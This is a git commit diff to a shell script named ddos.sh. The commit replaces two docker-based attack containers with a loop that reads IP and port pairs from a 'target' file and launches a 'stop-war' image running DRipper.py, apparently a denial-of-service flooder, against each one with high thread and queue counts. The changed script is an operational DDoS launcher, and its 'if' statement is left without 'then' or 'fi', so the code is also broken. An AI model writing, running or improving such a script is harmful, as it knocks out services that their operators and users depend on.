eab743a0f8ba90404bdbe5bfce462c90cd909f91
Andrew G Sorokin <angello@elm.dp.ua>
2022-03-03 17:49:08 +0200

    modify ddos.sh

--- ddos.sh
+++ ddos.sh
@@ -2,10 +2,13 @@
 
 cd /root/stopWar
 
-/usr/bin/docker rm -f ddos
-/usr/bin/docker pull angello2docker/nowarddos:latest
-/usr/bin/docker run -d --restart always --name ddos angello2docker/nowarddos:latest
+[ -f docker.list ] && cat docker.list | xargs docker rm -f && cat /dev/null > docker.list
 
-/usr/bin/docker rm -f ufo
-/usr/bin/docker pull freedomwarrior/ufo:v1
-/usr/bin/docker run -d --restart always --name ufo freedomwarrior/ufo:v1
+/usr/bin/docker pull cherniavsky94/stop-war
+
+cat target | while read ip port
+do
+    if [ ! X$ip = X -a ! X$port = X ]
+    /usr/bin/docker run -d cherniavsky94/stop-war python3 DRipper.py -s $ip -p $port -t 500 -q 10000 >> docker.list
+done
+
